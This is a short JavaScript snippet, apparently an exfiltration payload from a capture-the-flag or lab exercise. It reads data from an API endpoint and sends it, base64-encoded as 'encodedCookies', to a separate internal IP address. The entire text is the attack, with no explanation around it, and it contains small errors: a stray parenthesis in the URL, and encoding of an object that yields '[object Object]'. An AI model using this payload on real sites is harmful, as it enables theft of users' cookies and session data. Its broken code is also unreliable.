fetch("https://guitjapeo.thl/api/info")
  .then((response) => response.json())
  .then((data) => {
 
    fetch(`http://10.10.0.10/?encodedCookies=${btoa(data)})`);
  });
